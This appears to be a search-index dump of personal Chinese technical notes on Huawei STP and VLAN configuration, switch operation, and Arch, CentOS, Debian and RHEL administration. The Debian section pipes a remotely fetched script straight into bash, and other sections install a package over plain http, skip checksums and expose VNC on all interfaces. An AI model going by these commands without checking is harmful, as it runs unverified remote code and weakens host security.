桥ID具体示意 从高位比较再到低位；值越小越优先。（选值4096的倍数） 端口ID具体示意 从高位比较再到低位；值越小越优先（端口编号与实际接口无关，选值16的倍数） 路径开销示意 （98年制定的旧链路开销标准，现在链路的带宽都不止10G，在计算带宽时存在不合理） （华为设备现在所支持的链路开销标准802.1t，使用链路聚合的开销=开销标准/链路数量） 根路径开销示意（由路径开销计算出根路径开销,根桥发出的BPDU开销为0) （从根桥发出的开销为0，在根据自己所有收到的接口到根桥的开销相加，取最小的开销值，就是根路径开销） STP选举过程：（在STP中优先级是越小越好） BID最小的成为根桥（先比较优先级再比较交换机Mac地址） （开始都会发送BPDU，在收到与自己的参数比较，然后清楚自己的角色） （先看RPC再看对端BID，然后比较对端PID，最后比较本地PID） （在每条链路上选举一个指定端口负责数据的收发，“根路径开销”是比较端口的RPC越小越好，所以根桥的端口都是0，为指定端口//当拿一根线插在同一个根桥时，根桥的端口会比较到PID，就不会都是指定端口，其中一个为预备端口状态变成阻塞） 剩下的端口就是预备端口状态为阻塞 STP的端口状态： STP端口状态 接收BPDU 转发BPDU 学习MAC 转发数据 过渡状态 稳定状态 Disabled禁用 × × × × × √ Blocking阻塞 √ × × × × √ Listening监听 √ √ × × √ × Learning学习 √ √ √ × √ × Forwarding转发 √ √ √ √ × √ 1.禁用 disable 未开启STP协议 2.阻塞 blocking 接收BPDU 3.侦听 listening 接收BPDU 转发BPDU 4.学习 learning 接收BPDU 转发BPDU 学习MAC地址 5.转发 forwarding 接收BPDU 转发BPDU 学习MAC地址 转发用户流量 注：华为交换机默认显示RSTP状态，附RSTP状态与STP端口状态对比 STP的计数器： 计时器 备注 Hello 2s，根桥发送BPDU的间隔 Forwarding Delay转发延时 15s，监听和学习的持续实际（监听到学习需要15S，学习到转发需要15s） MSG Age 当前的年龄，每经过一个设备就加1（从根桥开始为0往下算），最大为20，超过20则丢弃.（不建议接太多设备影响交换机性能） Max Age 20s，保持阻塞的最大时间（每2秒收到一次，通过比较最后阻塞，若20秒没收到就不再阻塞） 一个预备端口从阻塞状态到转发状态的时间：50S MSG Age STP的端口状态转换： STP拓扑变化： 根桥故障需要等待50S，网络才会恢复正常（20S老化时间和30S变成转发状态） （SWB检测到自己的根端口与根桥断了，立马将预备端口从阻塞状态变成转发状态，需要经过2个forwarding delay阻塞——15s监听——15s转发）这个过程需要30s （当SWB发生设备故障后，会发出我是根桥的BPDU，SWC收到2个对端发来的BPDU经过比较发现并不是最优的，接收但不会改变该角色，等到老化时间才会改变角色状态）这个过程需要50s 拓扑改变导致MAC地址表错误 MAC地址表老化太长，链路角色变换，但是MAC地址还是原来（要么等待300S或ARP老化） 解决方法： 检测到拓扑变化的交换机通过根端口向根桥发TCN，步骤1 上游交换机收到TCN后回应TCA，让下游交换机停止发送TCN，步骤2 再通过根端口发送TCN直到根桥收到，步骤3 根桥通过指定端口发送TC通知所有下游交换机把MAC地址表的老化时间300秒变成15秒。步骤4，5 BPDU字段中的Flags中： 1000 0000最高位为1作为TCA 0000 0001最低位为1作为TC STP的配置 命令 备注 stp mode {mstp \\ stp \\ rstp} 调整STP的模式，默认MSTP stp priority 4096 调整BID优先级值，0~61440，步长为4096的倍数 stp root primary / secondary 自动修改优先级，指定主/备根桥 stp pathcost-standard{ dot1d-1998 \\ dot1t \\ legacy } 配置计算路径开销值得标准 开销标准： legacy标准：cost=1~200000，华为私有802.1d标准：cost=1~65535802.1t标准：cost=1~200000000，默认 stp cost 10 修改STP开销 stp port priority 144 修改PID优先级，0~240，步长为16的倍数 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:16 "},"1.数据通信/5.交换/VLAN.html":{"url":"1.数据通信/5.交换/VLAN.html","title":"VLAN","keywords":"","body":" VLAN技术背景： 划分VLAN，将广播域范围减小 VLAN优点： 有效控制广播域范围 增强局域网的安全性 灵活构建虚拟工作组 简化网络管理 VLAN概述：Virtual LAN 虚拟局域网 将一个物理局域网在逻辑上划分成多个广播域 1 VLAN = 1 广播域 = 1 子网 （划分最好一个子网一个VLAN） 广播不会在不同VLAN间转发，而是限制在相同的VLAN中 不同VLAN间的设备默认无法通信 VLAN范围：0~4095 （0和4095保留，1为默认） VLAN划分：基于端口最常见 VLAN标签介绍： IEEE 802.1q：又称dot1q，是VLAN的正式标准，对Ethernet帧格式进行修改，在源Mac地址字段和协议类型字段中插入了4字节的802.1q Tag 每台支持802.1q协议的交换机发送的数据帧都会包含VLAN ID，以指明数据帧属于哪一个VLAN。因此，在一个VLAN交换网络中，以太网帧有以下两种格式 无标记帧（untagged frame） 原始的数据帧，未加入4字节802.1q tag的字段 有标记帧（tagged frame） 插入了4字节802.1q tag的字段 路由器和终端设备发送的数据帧默认是untagged frame，默认也识别不了tagged frame VLAN链路类型： 类型 备注 Access Link 接入链路 一般用于连接主机或路由器之间的链路接入链路上传输的帧都是untagged帧 Trunk Link干道/中继链路 一般用于交换机间的互连或交换机与路由器之间的链路干道链路上传输的帧几乎都是tagged帧用于两端识别 PVID：Port Vlan identification 端口缺省VLAN 指明该接口属于的VLAN VLAN端口类型： 类型 备注 Untagged 未打标签 Tagged 打标签 Access接入端口 用于连接主机收到数据后会添加VLAN Tag，VLAN ID和端口的PVID相同转发数据前会移除VLAN Tag注意：终端设备（PC）发出和接收的都是untagged的帧，否则无法识别 图例主机AC属于一个VLAN，B属于另一个VLAN,A与C相互通讯的演示 Trunk干道端口 用于连接交换机或路由器收到帧时：如果该帧不包含Tag，将打上端口的PVID；如果该帧包含Tag，则不改变。发送帧时：首先要保证该帧的VLAN ID在Trunk的允许发送列表中（华为默认只允许VLAN1，思科默认允许所有VLAN)若与端口的PVID相同时，则剥离Tag发送；若与端口的PVID不同时，则直接发送。 图例主机A与C通信，主机B与D通信 Hybrid混杂端口 既可以连接主机，又可以连接其他交换机。既可以连接接入链路又可以连接干道链路。允许多个VLAN的帧通过，并可以在出接口方向将某些VLAN帧的Tag剥离掉（由命令决定） 图例主机A与主机B不能相互访问，但都可以访问PVID100的服务器 交换机之间的g0/0/1口可以打标签也可以不打标签，打标签就是Trunk模式，不打就是Acess模式 即 port hybrid tagged vlan 2 3 100这条命令可以不写 Access端口白话解释： 交换机每个接口有PVID，默认PVID=1，可以修改。 当接口为Access模式时： 收到未打标签（untagged）的帧会添加接口的PVID 收到打标签（tagged）的帧会直接修改为tagged帧的VLAN Tag 发帧时统一剥离VLAN Tag（Untagged）并与发送接口的PVID比较，一致转发不一致丢弃 Trunk端口白话解释： 交换机每个接口有PVID，默认PVID=1，可以修改。 接口为Trunk模式时： 收到未打标签的帧，将打上端口的PVID（和access模式一样） 收到打标签的帧，则不改变直接转发 发送帧时，先检查该帧VLAN ID在Trunk的允许发送列表 若发送的帧与端口的PVID相同，剥离Tag发送；（和access模式一样） 若与端口的PVID不同时，则直接发送。 Hybrid端口白话解释：（华为私有接口） 交换机每个接口有PVID，默认PVID=1，可以修改。 可以任意指定数据帧发送或接收是否携带tagged 接口属于混杂模式，既可以是Trunk又可以是Acess 收帧时既可以打上标签（Access），也可以直接转发带标签的帧（Trunk） 发帧时既可以直接转发带标签的帧（Trunk），也可以剥离标签（Acess） 交换机判断VLAN的逻辑： VLAN配置： 命令 备注 vlan 10 创建单个VLAN vlan batch 10 to 20 创建多个VLAN port link-type accessport link-type trunkport link-type hybrid 配置接口类型简写为P L A、P L T、P L H port default vlan 10 配置access关联的VLAN/PVID,简写 P D V 10 port trunk allow-pass vlan 10 配置Trunk允许通过的VLAN，简写P L A V 10华为默认只允许VLAN1 port trunk pvid vlan 10 配置Trunk的PVID port hybrid tagged vlan 10port hybrid untagged vlan 10 配置Hybird标记VLAN（标记和剥离） port hybrid pvid vlan 10 配置Hybird的PVID display vlan 验证VLAN display port vlan 10 验证VLAN 交换机的工作原理： VLAN间路由 VLAN间通信限制：每一个VLAN都是独立的广播域，不同VLAN之间隔离，因此不同VLAN的节点之间是无法直接访问 VLAN间通信方法（路由）： 使用路由器完成不同VLAN通信 （缺点：每一个VLAN就需要绑定一个物理接口） 使用一个接口的子接口（虚拟接口），来绑定VLAN大大减少了资源消耗 交换机设置为Trunk，路由器如何识别VLAN？ dot1q termination vid 10 作用：该子接口与VLAN10绑定，收到VLAN10就剥离VLAN，查看路由表执行路由转发，转发在打上转发接口的PVID 路由器一般用作出口设备（广播域太大），且价格较贵，使用路由器实现VLAN间通信不经济 使用具有路由功能的交换机实现VLAN间通信 VLAN配置： 命令 备注 Vlan 10 创建单个VLAN Vlan batch 10 20 创建多个VLAN Port link-type access/trunk/hybrid 配置接口类型 Port default vlan 10 配置access关联VLAN/PVID Port trunk allow-pass vlan 10 配置trunk允许VLAN通过（默认只允许VLAN1通过） Port trunk pvid vlan 10 配置trunk的PVID Port hybrid tagged/untagged vlan 10 配置hybrid标记VLAN Port hybrid pvid vlan 10 配置hybrid的PVID Display vlan 验证VLAN Display port vlan 验证VLAN Dot1q termination vid 10 子接口和VLAN关联 Arp broadcast enable 开启子接口的ARP广播功能 portswitch 配置接口工作为2层 Undo portswitch 配置接口工作为3层 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:18 "},"1.数据通信/5.交换/交换机的工作原理.html":{"url":"1.数据通信/5.交换/交换机的工作原理.html","title":"交换机的工作原理","keywords":"","body":"交换基础 网络分层设计： 易于理解、学习、排错 层次 备注 接入层Access layer 用户接入 接入安全 访问控制 汇聚层Distribution layer 流量汇聚 链路冗余 设备冗余 路由选择 核心层Core layer 高速转发 服务器接入 路由选择 出口层Speak layer 广域网接入 出口策略 带宽控制 对层次的带宽要求几何增长 对层次的设备性能要求集合增长 交换机的主要功能： 交换机根据MAC地址来转发数据帧 交换机的工作原理：根据MAC地址表中的MAC地址表项，做出智能转发 原理 备注 学习 Learn 从一个接口收到数据帧时，把数据帧的源MAC地址和该接口进行绑定，存放MAC地址表 泛洪Flood 从一个接口收到广播帧、组播帧、未知单播帧，把该帧从其他所有接口转发出去（除接收口） 转发Forward 从一个接口收到已知单播帧，立即从相应的接口转发出去（除目标地址是自己） 更新Update 交换机地址表中的表项默认的保存300秒交换机重启会清空所有接口学习到的记录接口关闭后会清空该接口学习到的记录一个源MAC地址出现在别的接口上，会删除老的记录，添加新的记录 注： 对应一台交换机来说：一个MAC地址只能关联一个接口上一个接口可以存在多个MAC地址 以太网接口工作模式： 术语 备注 半双工 half-duplex通信双方不能同时发送接收数据 全双工 full-duplex通信双方可以同时发送接收数据 速率 Speed接口两端连接时进行协商，协商失败无法正常通信 可以设置两端的通信模式默认是自动（选取两端设备的最低值） 网络速度无其他因素影响，但网速很慢可能是半双工模式 电脑设置通信模式： 交换机设置通信模式： 术语 备注 undo negotiation auto 取消自动协商 speed 100 设置速率 duplex full 设置通信模式为全双工 duplex half 设置通信模式为半双工 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-09 21:13 "},"2.系统运维/Arch+Windows双系统引导恢复.html":{"url":"2.系统运维/Arch+Windows双系统引导恢复.html","title":"Arch+Windows双系统引导恢复","keywords":"","body":"一、Windows引导缺失 二、Arch引导缺失 进入Arch恢复U盘 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Arch任务栏后台应用没有图标.html":{"url":"2.系统运维/Arch任务栏后台应用没有图标.html","title":"Arch任务栏后台应用没有图标","keywords":"","body":"在目录 /usr/share/applications 或 ~/.local/share/applications 添加 mendeley.desktop 注意icon=xxx/xxx.png 这一行，可从google image等下载相应图标，放到某一路径。如不正确，则在Show Application 中没有图标。 注意 StartupWMClass=xxx 这一行，可用命令 xprop WM_CLASS， 再点击目标应用mendeley窗口，可获得相应类别，如不正确，可能导致taskbar 上的应用没有图标。参考ubuntu: icon miss when application is launched [Desktop Entry] Version=1.0 Type=Application Name=Mendeley Reference Manager GenericName=Mendeley Reference Manager Comment=mendeley reference manager StartupWMClass=Mendeley Reference Manager TryExec=mendeley Exec=mendeley Icon=/home/xxx/.local/share/icons/hicolor/48x48/mimetypes/mendeley.png Categories=Tools; 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Arch创建虚拟网卡.html":{"url":"2.系统运维/Arch创建虚拟网卡.html","title":"Arch创建虚拟网卡","keywords":"","body":"创建虚拟网卡： >$ sudo ip link add dev virnet0 type veth 其中 virnet0 是虚拟网卡的名字，可以换成你喜欢的名字。 接下来为虚拟网卡配置IP地址： >$ sudo ip addr add 192.168.20.1/24 dev virnet0 激活虚拟网卡，以下两条命令使用任意一条均可： >$ sudo ip link set virnet0 up >$ sudo ifconfig virnet0 up 现在虚拟网卡已经激活了，可以查看它的状态了： >$ sudo ip link show virnet0 7: virnet0@veth0: mtu 1500 qdisc noqueue state LOWERLAYERDOWN mode DEFAULT group default qlen 1000 link/ether 7e:5e:f0:ca:c9:74 brd ff:ff:ff:ff:ff:ff 当然也可以用 ifconfig 查看状态： >$ ifconfig virnet0 virnet0: flags=4099 mtu 1500 inet 192.168.99.2 netmask 255.255.255.0 broadcast 0.0.0.0 ether 7e:5e:f0:ca:c9:74 txqueuelen 1000 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 停用虚拟网卡，同样是以下两条命令任选其一： >$ sudo ip link set virnet0 down >$ sudo ifconfig virnet0 down 此时再查看虚拟网卡的状态，发现已经是 down 的状态了： >$ sudo ip link show virnet0 7: virnet0@veth0: mtu 1500 qdisc noqueue state LOWERLAYERDOWN mode DEFAULT group default qlen 1000 link/ether 7e:5e:f0:ca:c9:74 brd ff:ff:ff:ff:ff:ff 删除虚拟网卡： >$ sudo ip link delete dev virnet0 再次查看虚拟网卡的状态，会提示该设备不存在： >$ sudo ip link show virnet0 Device \"virnet0\" does not exist. 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Arch双显卡驱动安装.html":{"url":"2.系统运维/Arch双显卡驱动安装.html","title":"Arch双显卡驱动安装","keywords":"","body":"集成显卡 通过以下命令安装如下几个包即可： sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Arch多版本jdk共存以及切换.html":{"url":"2.系统运维/Arch多版本jdk共存以及切换.html","title":"Arch多版本jdk共存以及切换","keywords":"","body":"ArchLinux提供了archlinux-java命令来切换jdk版本，使用如下： 使用ArchLinux的包管理器安装openjdk8和openjdk11 $ sudo pacman -S jdk8-openjdk jdk11-openjdk 使用archlinux-java切换默认jdk版本 # 查看archlinux-java使用说明 $ archlinux-java --help # 查看jdk状态 $ archlinux-java status Available Java environments: java-11-openjdk java-8-openjdk (default) # 获取默认jdk $ archlinux-java get java-8-openjdk # 设置默认jdk $ sudo archlinux-java set java-11-openjdk # 查看切换后的jdk版本 $ java -version openjdk version \"11.0.13\" 2021-10-19 OpenJDK Runtime Environment (build 11.0.13+8) OpenJDK 64-Bit Server VM (build 11.0.13+8, mixed mode) 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Arch安装KVM.html":{"url":"2.系统运维/Arch安装KVM.html","title":"Arch安装KVM","keywords":"","body":"安装使用 KVM(Kernel-based Virtual Machine, 即内核级虚拟机) 是一个开源的系统虚拟化模块。 QEMU是个独立的虚拟化解决方案，从这个角度它并不依赖KVM。而KVM是另一套虚拟化解决方案，不过因为这个方案实际上只实现了内核中对处理器（Intel VT）, AMD SVM)虚拟化特性的支持，换言之，它缺乏设备虚拟化以及相应的用户空间管理虚拟机的工具，所以它借用了QEMU的代码并加以精简，连同KVM一起构成了另一个独立的虚拟化解决方案：KVM + QEMU。 要使用起来，需要硬件支持，并且需要加载相应的模块。按以下的步骤去检测安装即可。 sudo pacman -S qemu libvirt ovmf virt-manager dnsmasq bridge-utils openbsd-netcat kvm 负责CPU和内存的虚拟化 qemu 向Guest OS模拟硬件（例如，CPU，网卡，磁盘，等） ovmf 为虚拟机启用UEFI支持 libvirt 提供管理虚拟机和其它虚拟化功能的工具和API virt-manager 是管理虚拟机的GUI 注 : 实际上，这步只需要安装qemu就可以使用虚拟机，但是qemu-kvm接口有些复杂，libvirt和virt-manager让配置和管理虚拟机更便捷。 启动KVM libvirt服务 启用服务并设置开机自启动 sudo systemctl enable libvirtd.service sudo systemctl start libvirtd.service 查看运行状态 systemctl status libvirtd.service 配置普通用户可以使用KVM 打开/etc/libvirt/libvirtd.conf文件进行编辑。 sudo pacman -S vim sudo vim /etc/libvirt/libvirtd.conf 将UNIX域套接字组所有权设置为libvirt（第85行左右） unix_sock_group = \"libvirt\" 为R/W套接字设置UNIX套接字权限（第102行附近） unix_sock_rw_perms = \"0770\" 将当前用户帐户添加到libvirt组 sudo usermod -a -G libvirt $(whoami) newgrp libvirt 重新启动libvirt守护进程。 sudo systemctl restart libvirtd.service 启用嵌套虚拟化（可选） 嵌套虚拟化就是在虚拟机中运行虚拟机。 如图所示，通过启用内核模块为kvm_intel / kvm_amd启用嵌套虚拟化。 一般不会这样搞。 ### Intel Processor ### sudo modprobe -r kvm_intel sudo modprobe kvm_intel nested=1 ### AMD Processor ### sudo modprobe -r kvm_amd sudo modprobe kvm_amd nested=1 要使此配置持久化，请运行： echo \"options kvm-intel nested=1\" | sudo tee /etc/modprobe.d/kvm-intel.conf 确认“嵌套虚拟化”设置为“yes”： ## Intel Processor ### $ systool -m kvm_intel -v | grep nested nested = \"Y\" nested_early_check = \"N\" $ cat /sys/module/kvm_intel/parameters/nested Y ### AMD Processor ### $ systool -m kvm_amd -v | grep nested nested = \"Y\" nested_early_check = \"N\" $ cat /sys/module/kvm_amd/parameters/nested Y 在Arch Linux 上使用KVM 至此，已经在Arch Linux上成功安装了KVM、QEMU和Virt Manager。现在就可以用了。 virt-install --name vmware --memory 8192 --vcpus sockets=2,cores=2,threads=2 --disk device=cdrom,path=/mnt/Windows-D/VirtualMachine/Images/VMware-VMvisor-Installer-201701001-4887370.x86_64.iso --disk path=/mnt/Windows-D/VirtualMachine/KVM/esxi-1.img,size=200,bus=ide --network bridge=virbr1,model=e1000 --noautoconsole --accelerate --hvm --graphics vnc,listen=0.0.0.0,port=20005 --video vga --input tablet,bus=usb --cpu host-passthrough 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Arch安装卸载软件常用命令.html":{"url":"2.系统运维/Arch安装卸载软件常用命令.html","title":"Arch安装卸载软件常用命令","keywords":"","body":"简介 pacman是arclinux中的软件管理工具，可以直接从网络上的软件仓库下载安装及删除软件，自动处理依赖关系，类似ubuntu中的apt-get。pacman也是widows上msys2默认的软件管理工具。 安装软件 安装软件。也可以同时安装多个包，只需以空格分隔包名即可。 pacman -S 软件名 安装软件，但不重新安装已经是最新的软件。 pacman -S --needed 软件名1 软件名2 安装软件前，先从远程仓库下载软件包数据库(数据库即所有软件列表)。 pacman -Sy 软件名 在显示一些操作信息后执行安装。 pacman -Sv 软件名 只下载软件包，不安装。 pacman -Sw 软件名 安装本地软件包。 pacman -U 软件名.pkg.tar.gz 安装一个远程包（不在 pacman 配置的源里面）。 pacman -U http://www.example.com/repo/example.pkg.tar.xz 更新系统 从服务器下载新的软件包数据库（实际上就是下载远程仓库最新软件列表到本地）。 pacman -Sy 升级所有已安装的软件包。 pacman -Su pacman 可以用一个命令就可以升级整个系统。花费的时间取决于系统有多老。这个命令会同步非本地(local)软件仓库并升级系统的软件包： pacman -Syu 在msys2中 pacman -Syu后需要重启一下msys2(关掉shell重新打开即可)。 在Arch linux中，只支持系统完整升级，不支持部分升级。所以即使在msys2中，pacman -Syu也会升级整个系统。可以观察一下，即使新安装的msys2，pacman -Syu后，msys2安装目录占用空间立马变大很多。 如果升级时，网络比较慢，觉得既浪费时间又浪费硬盘，实在不想升级那么多东西，可以逐个软件包升级。用下面命令可以升级核心包： pacman -S --needed filesystem msys2-runtime bash libreadline libiconv libarchive libgpgme libcurl pacman ncurses libintl 卸载软件 该命令将只删除包，保留其全部已经安装的依赖关系 pacman -R 软件名 删除软件，并显示详细的信息 pacman -Rv 软件名 删除软件，同时删除本机上只有该软件依赖的软件。 pacman -Rs 软件名 删除软件，并删除所有依赖这个软件的程序，慎用 pacman -Rsc 软件名 删除软件,同时删除不再被任何软件所需要的依赖 pacman -Ru 软件名 搜索软件 在仓库中搜索含关键字的软件包（本地已安装的会标记） pacman -Ss 关键字 显示软件仓库中所有软件的列表，可以省略，通常这样用:pacman -Sl | 关键字 pacman -Sl 搜索已安装的软件包 pacman -Qs 关键字 列出所有可升级的软件包 pacman -Qu 列出不被任何软件要求的软件包 pacman -Qt 参数加q可以简洁方式显示结果，比如pacman -Ssq gcc会比pacman -Ss gcc显示的好看一些。 pacman -Sl | gcc跟pacman -Ssq gcc很接近，但是会少一些和gcc有关但软件名不包含gcc的包。 查询软件信息 查看软件包是否已安装，已安装则显示软件包名称和版本 pacman -Q 软件名 查看某个软件包信息，显示较为详细的信息，包括描述、构架、依赖、大小等等 pacman -Qi 软件名 列出软件包内所有文件，包括软件安装的每个文件、文件夹的名称和路径 pacman -Ql 软件名 清理缓存 清理未安装的包文件，包文件位于 /var/cache/pacman/pkg/ 目录。 pacman -Sc 清理所有的缓存文件。 pacman -Scc yay Yet Another Yogurt: 一个用于 Arch Linux 的工具，用于从 Arch User Repository 中构建和安装软件包。 另见 pacman。 从仓库和 AUR 中交互式搜索和安装软件包： yay {{软件包|搜索词}} 同步并更新所有来自仓库和 AUR 的软件包： yay 只同步和更新 AUR 软件包： yay -Sua 从仓库和 AUR 中安装一个新的软件包。 yay -S {{软件包}} 从仓库和 AUR 中搜索软件包数据库中的关键词： yay -Ss {{关键词}} 显示已安装软件包和系统健康状况的统计数据： yay -Ps 最常用的pacman命令小结 pacman命令较多，作为新手，将个人最常用的命令总结如下： pacman -Syu: 升级系统及所有已经安装的软件。 pacman -S 软件名: 安装软件。也可以同时安装多个包，只需以空格分隔包名即可。 pacman -Rs 软件名: 删除软件，同时删除本机上只有该软件依赖的软件。 pacman -Ru 软件名: 删除软件，同时删除不再被任何软件所需要的依赖。 pacman -Ssq 关键字: 在仓库中搜索含关键字的软件包，并用简洁方式显示。 pacman -Qs 关键字: 搜索已安装的软件包。 pacman -Qi 软件名: 查看某个软件包信息，显示软件简介,构架,依赖,大小等详细信息。 pacman -Sg: 列出软件仓库上所有的软件包组。 pacman -Sg 软件包组: 查看某软件包组所包含的所有软件包。 pacman -Sc：清理未安装的包文件，包文件位于 /var/cache/pacman/pkg/ 目录。 pacman -Scc：清理所有的缓存文件。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:57 "},"2.系统运维/Arch安装问题.html":{"url":"2.系统运维/Arch安装问题.html","title":"Arch安装问题","keywords":"","body":"一、无法识别声卡 sudo pacman -S sof-firmware reboot 二、无法识别摄像头 ``` # 三、常用软件 ```shell # WPS中文版+字体 sudo pacman -S wps-office-cn wps-office-mime-cn wps-office-mui-zh-cn wps-office-fonts ttf-ms-fonts ttf-wps-fonts 四、安装微软字体 方法一： 准备 PKGBUILD Archlinux 中 AUR – ttf-ms-win10 提供了 PKGBUILD git clone https://aur.archlinux.org/ttf-ms-win10.git 您可以编辑 PKGBUILD 添加 simfang.ttf simhei.ttf simkai.ttf，或直接从 此处 获取 从 Windows 10 中复制字体文件 将 Windows/Fonts 中所有文件和 Windows/System32 中的 license.rtf 复制到 ttf-ms-win10 文件夹中 您也可以从文末链接中下载博主从 Windows 中打包的字体压缩包，解压到 ttf-ms-win10 中即可 安装软件包 在 ttf-ms-win10 目录下，执行 makepkg --skipchecksums 由于 Windows 10 内部版本不同，使用 --skipchecksums 跳过文件校验 刷新字体缓存 fc-cache 方法二：（推荐） 获取字体 windwos中获取微软雅黑字体，在C:\\Windows\\Fonts下拷贝微软雅黑字体 拷贝字体到Linux系统中，在 /usr/share/fonts/ 下新建 msyh 文件夹 cd /usr/share/fonts/ sudo mkdir msyh 拷贝字体到msyh文件夹 sudo cp path/*ttc /usr/share/fonts/msyh 执行命令 cd /usr/share/fonts/msyh sudo mkfontscale sudo mkfontdir 刷新字体 fc-cache 刷新系统字体 fc-cache -fv 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Arch桌面替换KDE为GNOME.html":{"url":"2.系统运维/Arch桌面替换KDE为GNOME.html","title":"Arch桌面替换KDE为GNOME","keywords":"","body":"[feiyu@Manjaro ~ ]$ sudo pacman -S gnome gnome-extra :: 在组 gnome 中有 59 成员： :: 软件仓库 extra 1) baobab 2) epiphany 3) evince 4) gdm 5) gnome-backgrounds 6) gnome-calculator 7) gnome-calendar 8) gnome-characters 9) gnome-clocks 10) gnome-color-manager 11) gnome-connections 12) gnome-console 13) gnome-contacts 14) gnome-control-center 15) gnome-disk-utility 16) gnome-font-viewer 17) gnome-keyring 18) gnome-logs 19) gnome-maps 20) gnome-menus 21) gnome-music 22) gnome-remote-desktop 23) gnome-session 24) gnome-settings-daemon 25) gnome-shell 26) gnome-shell-extensions 27) gnome-software 28) gnome-system-monitor 29) gnome-text-editor 30) gnome-tour 31) gnome-user-docs 32) gnome-user-share 33) gnome-weather 34) grilo-plugins 35) gvfs 36) gvfs-afc 37) gvfs-dnssd 38) gvfs-goa 39) gvfs-google 40) gvfs-gphoto2 41) gvfs-mtp 42) gvfs-nfs 43) gvfs-onedrive 44) gvfs-smb 45) gvfs-wsdd 46) loupe 47) malcontent 48) nautilus 49) orca 50) rygel 51) simple-scan 52) snapshot 53) sushi 54) tecla 55) totem 56) tracker3-miners 57) xdg-desktop-portal-gnome 58) xdg-user-dirs-gtk 59) yelp 输入某个选择 ( 默认=全部选定 ): :: 在组 gnome-extra 中有 47 成员： :: 软件仓库 extra 1) accerciser 2) cheese 3) d-spy 4) dconf-editor 5) devhelp 6) endeavour 7) eog 8) evolution 9) file-roller 10) five-or-more 11) four-in-a-row 12) geary 13) gedit 14) ghex 15) gitg 16) glade 17) gnome-2048 18) gnome-boxes 19) gnome-builder 20) gnome-chess 21) gnome-devel-docs 22) gnome-dictionary 23) gnome-games 24) gnome-klotski 25) gnome-mahjongg 26) gnome-mines 27) gnome-multi-writer 28) gnome-nibbles 29) gnome-notes 30) gnome-photos 31) gnome-recipes 32) gnome-robots 33) gnome-sound-recorder 34) gnome-sudoku 35) gnome-taquin 36) gnome-terminal 37) gnome-tetravex 38) gnome-tweaks 39) hitori 40) iagno 41) lightsoff 42) polari 43) quadrapassel 44) seahorse 45) swell-foop 46) sysprof 47) tali 输入某个选择 ( 默认=全部选定 ): 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Centos常用软件包安装.html":{"url":"2.系统运维/Centos常用软件包安装.html","title":"Centos常用软件包安装","keywords":"","body":"1、htop sudo yum install epel-release -y && sudo yum install htop -y 2、nginx sudo rpm -ivh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm && sudo yum install -y nginx 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Centos开启VirtualBox增强模式.html":{"url":"2.系统运维/Centos开启VirtualBox增强模式.html","title":"Centos开启VirtualBox增强模式","keywords":"","body":"问题 运行安装程序报错找不到kernel-header 1、更新kernel内核版本 sudo yum update kernel -y 2、安装kernel header sudo yum install kernel-headers kernel-devel gcc make -y 3、运行安装程序 双击打开桌面增强的iso文件，右键文件空白处打开终端， 运行： sudo sh VBoxLinuxAdditions.run 成功！ 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/Debian软件安装.html":{"url":"2.系统运维/Debian软件安装.html","title":"Debian软件安装","keywords":"","body":"1. nvm（nodejs版本管理器） curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash source ~/.bashrc 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"2.系统运维/RHEL8搭建DNS服务器.html":{"url":"2.系统运维/RHEL8搭建DNS服务器.html","title":"RHEL8搭建DNS服务器","keywords":"","body":"一、主要配置文件 主程序名：/usr/sbin/named 主配置文件：/etc/named.conf 区域配置文件：/etc/named.rfc1912.zones 正反向解析文件路径(名字可以自己随意设置)：/var/named/ 如：正向解析区域文件：xxx.com.zone 反向解析区域文件：xxx.com.arpa 二、准备工作 环境：两台红帽8.2；前提，做DNS服务器的系统必须已搭建完本地yum源，用于下载bind；两台虚拟机之间能够互相通信。 安装bind：sudo yum install bind* -y 三、开始搭建 注：本次搭建需要操作的文件全部都需要root权限才能修改，若不是root用户，记得用sudo命令。 修改配置文件/etc/named.conf 编辑区域信息配置文件 /etc/named.rfc1912.zones 注：直接在文件最后追加区域信息即可 ​ a. 